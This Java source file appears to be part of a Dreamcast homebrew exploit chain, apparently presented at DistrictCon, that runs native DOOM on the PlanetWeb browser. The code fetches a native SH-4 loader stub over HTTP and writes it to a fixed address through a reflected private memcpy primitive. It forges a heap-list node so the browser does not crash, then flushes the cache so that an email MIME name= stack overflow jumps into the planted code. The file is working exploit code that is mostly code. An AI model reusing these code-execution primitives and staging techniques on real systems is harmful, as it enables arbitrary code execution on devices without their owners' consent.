package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import com.planetweb.eden.client.system.SystemInterface;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.URL;

/**
 * CHAIN "stagedoom" -- FAST data transport + RELIABLE native code placement for the
 * email-overflow DOOM chain.
 *
 * Two reliable, Java-driven steps (Java runs deterministically every boot):
 *
 *  (1) TRANSPORT: download doom.bin + WAD over plain HTTP into ONE raw byte[] =
 *      MAGIC(8) + doom + wad, pinned in a static field (g_keepalive) so the native
 *      loader can scan the JVM heap for MAGIC and raw-memcpy it. No encoding.
 *
 *  (2) FIXED-ADDRESS STUB PLACEMENT (fixes exploit reliability): the native MIME
 *      name= stack overflow gives PC control, but the stack location at trigger time
 *      varies by ~32KB, so a hardcoded saved-PR -> on-stack-sled is a coin flip.
 *      Instead we use the proven setRawDeviceID(100) native memcpy primitive
 *      (dst = 0x8C29ABE6, FIXED) to plant the SH-4 loader stub at a DETERMINISTIC
 *      address 0x8C29ADE8 (= DST + 0x202, 4-aligned, byte-safe). We read-modify-write
 *      via getRawDeviceID(101) first so the IM-list head at DST+0x46 (and all other
 *      live data in the buffer) is PRESERVED -- only the stub bytes change, so the
 *      browser/mail UI keeps working until the email is opened.
 *
 *      The email then carries only:  pad(64) + saved-PR = 0x8C29ADE8.  The function's
 *      rts jumps straight to the planted stub -- no sled, no stack dependence.
 *
 * This is NOT "Java DOOM": Java is only the data pipe + placement; the game is native SH-4.
 */
public class StageDoom extends Service {
    static final String DOOM_URL = Junk.BASE + "/doom.bin";
    static final String WAD_URL  = Junk.BASE + "/doom.wad";
    static final String STUB_URL = Junk.BASE + "/stub.bin";       // Python-built native loader stub
    static final byte[] MAGIC = { 'D','O','O','M','S','T','G','1' };   // == poc/magic.txt
    static byte[] g_keepalive;   // keep the transport byte[] in the heap for the native scan
    static boolean g_running;    // guard: the Eden client can re-subscribe + re-spawn us while a
                                 // (slow) download is in flight; only ONE instance may run it.

    static final int DST      = 0x8C29ABE6;   // setRawDeviceID memcpy dest (fixed)
    static final int STUB_OFF = 0x202;        // stub offset in buffer -> DST+0x202 = 0x8C29ADE8 (4-aligned)
    static final int GET_RID  = 101;          // getRawDeviceID: read buffer at DST -> byte[]
    static final int SET_RID  = 100;          // setRawDeviceID: memcpy(DST, byte[], len)

    public ServiceInfo getInfo() {
        return new ServiceInfo("StageDoom", "2.0", "DistrictCon", Junk.BASE);
    }

    // content-length probe with the SAME timeout+retry discipline as readInto: on the flaky
    // emulated BBA this connect can HANG, and with no timeout it wedges run() before a single
    // byte of DOOM is fetched (the Eden client then re-subscribes and re-spawns us -> pileup).
    static int clen(final String u) throws Exception {
        for (int attempt = 0; attempt < 30; attempt++) {
            final int[] rn = { -2 };
            Thread t = new Thread(new Runnable() { public void run() {
                try {
                    java.net.HttpURLConnection c = (java.net.HttpURLConnection) new URL(u).openConnection();
                    int n = c.getContentLength(); c.getInputStream().close(); rn[0] = n;
                } catch (Exception e) { rn[0] = -1; }
            }});
            t.setDaemon(true); t.start();
            t.join(15000);
            if (rn[0] > 0) return rn[0];
            Eden.println("[~] clen retry " + attempt + " for " + u);
            try { Thread.sleep(500); } catch (Exception ig) {}
        }
        throw new Exception("clen failed after retries for " + u);
    }

    static void readInto(final String u, byte[] buf, int off, int len) throws Exception {
        // CHUNKED + per-chunk TIMEOUT download. Flycast's emulated BBA (picoppp userspace TCP)
        // is built for small gaming packets, not bulk HTTP: it wedges the browser's net thread
        // after a few dozen connections (empirically ~40, staging died at ~1.3MB with 32KB
        // chunks = ~40 conns). A single huge transfer ALSO hangs it, and PersonalJava 1.1.8 has
        // no setReadTimeout. Fix: use FEW, LARGE chunks (256KB -> ~15 connections for the whole
        // ~3.8MB payload, well under the wedge point) and PACE them (a short sleep between
        // chunks lets picoppp finish tearing down each connection before we open the next). Each
        // chunk still runs in a throwaway thread with a generous timeout; on hang/short we abandon
        // (it read into a temp buffer -> no corruption) and retry the SAME ?start=N&len=M offset.
        final int CHUNK = 262144;          // 256KB: the reliable READ size (448KB/512KB reads hang the net
                                           // thread -- stalled at chunk 1). The connection-accumulation that
                                           // used to kill 256KB near the end is fixed emulator-side now
                                           // (picoppp linger 10s->1s frees each connection's heap fast), so
                                           // ~14 connections no longer exhaust picotcp -> streams to the end.
        final int TIMEOUT = 45000;         // 45s/chunk -- generous for 256KB over the slow link
        int got = 0, fails = 0;
        byte[] scratch = new byte[CHUNK];   // REUSED across chunks (fresh only after a timeout, so a
                                            // timed-out zombie reader can't corrupt the next chunk)
        while (got < len) {
            final int want = (len - got < CHUNK) ? (len - got) : CHUNK;
            final int start = got;
            final byte[] tmp = scratch;   // this iteration's buffer instance (captured by the reader)
            final int[] rn = { -1 };
            final InputStream[] inh = { null };
            Thread t = new Thread(new Runnable() { public void run() {
                try {
                    InputStream in = new URL(u + "?start=" + start + "&len=" + want).openStream();
                    inh[0] = in;
                    int n, p = 0;
                    while (p < want && (n = in.read(tmp, p, want - p)) > 0) p += n;
                    try { in.close(); } catch (Exception e) {}
                    rn[0] = p;
                } catch (Exception e) { rn[0] = -1; }
            }});
            t.setDaemon(true); t.start();
            t.join(TIMEOUT);
            if (rn[0] == want) {                            // full chunk -> commit it
                System.arraycopy(tmp, 0, buf, off + start, want);
                got += want; fails = 0;
                // buffer REUSE (above) removes the per-chunk 256KB temp churn. Do NOT force
                // System.gc()/runFinalization() here: doing so every chunk crashed the EMULATED
                // browser at ~chunk 10 (it moves/finalizes native-backed socket objects mid-download
                // -> picoppp desync). A light pace lets picoppp reap the connection instead.
                try { Thread.sleep(250); } catch (Exception ig) {}
            } else {                                        // hung or short -> abandon + retry offset
                try { if (inh[0] != null) inh[0].close(); } catch (Exception e) {}
                scratch = new byte[CHUNK];   // fresh buffer -> the timed-out zombie keeps the old 'tmp'
                if (++fails > 80) throw new Exception("stalled at " + got + "/" + len + " for " + u);
                try { Thread.sleep(500); } catch (Exception ig) {}   // back off before re-opening
            }
        }
    }

    static byte[] httpGetAll(String u) throws Exception {
        InputStream in = new URL(u).openStream();
        byte[] tmp = new byte[65536]; int total = 0, n;
        byte[] out = new byte[0];
        while ((n = in.read(tmp)) > 0) {
            byte[] nn = new byte[total + n];
            System.arraycopy(out, 0, nn, 0, total);
            System.arraycopy(tmp, 0, nn, total, n);
            out = nn; total += n;
        }
        in.close();
        return out;
    }

    public void run() {
        synchronized (StageDoom.class) {
            if (g_running) { Eden.println("[i] StageDoom already staging -- ignoring re-spawn"); return; }
            g_running = true;
        }
        Junk.banner("CHAIN stagedoom v2 -- HTTP-stage blob + plant native stub @0x8C29ADE8");
        Junk.prove();
        try {
            // (1) TRANSPORT: stage MAGIC+doom+wad into the JVM heap (the stub scans for this)
            int doomLen = clen(DOOM_URL), wadLen = clen(WAD_URL);
            byte[] dd = new byte[8 + doomLen + wadLen];
            readInto(DOOM_URL, dd, 8, doomLen);
            readInto(WAD_URL,  dd, 8 + doomLen, wadLen);
            // MAGIC written LAST -- a partial/failed download (readInto throws on the flaky
            // link) leaves a dd in the heap WITHOUT the magic, so the native scanner skips it
            // and only ever finds a COMPLETE blob. (Bug: magic-first let the scanner copy a
            // WAD truncated at 343KB -> PNAMES missing -> R_Init I_Error -> hang.)
            System.arraycopy(MAGIC, 0, dd, 0, 8);
            g_keepalive = dd;     // pin in heap for the native loader's MAGIC scan
            String msg = "staged doom=" + doomLen + " wad=" + wadLen
                       + " byte[]=" + dd.length + " (MAGIC+doom+wad, raw, kept alive)";
            Eden.println("[+] " + msg);
            try { Junk.httpPost(Junk.BASE + "/heap", msg + "\n"); } catch (Throwable ig) {}

            // (2) PLACEMENT LAST: plant the stub only AFTER the (slow, flaky) download is done,
            //     so the fake IM node at 0x46 sits for the brief moment before the user clicks
            //     -- not through the whole download where an IM teardown can fault on it.
            plantStub();
            Eden.println("[+] READY: blob staged + stub planted -> open DOOM-STAGE to fire");
        } catch (Throwable t) {
            Eden.println("[!] stagedoom: " + t); t.printStackTrace();
        }
    }

    static void p32(byte[] b, int o, int v) {
        b[o]=(byte)v; b[o+1]=(byte)(v>>8); b[o+2]=(byte)(v>>16); b[o+3]=(byte)(v>>24);
    }

    // Plant our SH-4 loader stub at the FIXED, deterministic address 0x8C29ADE8 via the
    // setRawDeviceID(100) memcpy primitive. We cannot read back the buffer (getRawDeviceID
    // returns only 8 bytes), so -- following the proven RawDeviceIDExploit layout that
    // survives planting -- we keep a VALID IM-list node at DST+0x46 (zeroing it crashes the
    // browser) but make its teardown-unlink write to harmless scratch, so the stub is NOT
    // auto-triggered: the only trigger is the reliable email overflow (saved-PR=stub addr).
    void plantStub() throws Exception {
        byte[] stub = httpGetAll(STUB_URL);
        Eden.println("[*] fetched native stub: " + stub.length + " bytes");

        SystemInterface si = Eden.getSystemInterface();
        Method m = SystemInterface.class.getDeclaredMethod(
            "sendMessage", new Class[]{ Integer.TYPE, Object.class, Object.class });
        m.setAccessible(true);

        // preserve the 8-byte device ID (offset 0) just in case the browser reads it
        Object r = m.invoke(si, new Object[]{ new Integer(GET_RID), null, null });
        byte[] devid = (r instanceof byte[]) ? (byte[]) r : new byte[0];

        final int OFF_FAKE = 0x100;                 // fake IM node struct
        final int OFF_SCRATCH = 0x1C0;              // harmless unlink write target (zeroed gap)
        int fakeAddr = DST + OFF_FAKE;

        byte[] buf = new byte[STUB_OFF + stub.length];   // 0x202 + 362 = 0x36C
        System.arraycopy(devid, 0, buf, 0, devid.length > 8 ? 8 : devid.length);
        // IM-list head -> our fake node (keeps the IM subsystem from derefing null)
        p32(buf, 0x46, fakeAddr);
        // fake node: unlink does *(prev+0x3C) = next.  Make it harmless:
        //   prev+0x3C = DST+OFF_SCRATCH (zeroed buffer scratch);  next = 0
        p32(buf, OFF_FAKE + 0x3C, 0);                          // next = 0 (terminates iteration)
        p32(buf, OFF_FAKE + 0x40, (DST + OFF_SCRATCH) - 0x3C); // prev -> harmless scratch write
        // the loader stub at the deterministic address
        System.arraycopy(stub, 0, buf, STUB_OFF, stub.length);

        m.invoke(si, new Object[]{ new Integer(SET_RID), buf, null });

        // SH-4 D-CACHE FLUSH (real hardware; a harmless no-op under Flycast). setRawDeviceID wrote
        // the stub through the WRITE-BACK D-cache, so it sits DIRTY in the 16KB cache, NOT in RAM.
        // When the email overflow later returns into 0x8C29ADE8, the SH-4 INSTRUCTION fetch reads
        // RAM (it does NOT snoop the D-cache) and gets STALE bytes -> instant crash (no flicker).
        // Touch 64KB of fresh memory to cycle the whole D-cache (>=4x its size), forcing every dirty
        // line -- including the stub's ~48 lines -- to be written back to RAM before the jump.
        byte[] flush = new byte[65536];
        int acc = 0;
        for (int i = 0; i < flush.length; i += 32) { flush[i] = (byte) i; acc ^= flush[i]; }
        Eden.println("[+] planted stub @0x8C29ADE8 (DST+0x202), buf=" + buf.length
                     + " -- D-cache flushed to RAM via 64KB churn (acc=" + acc + ")");
    }
}
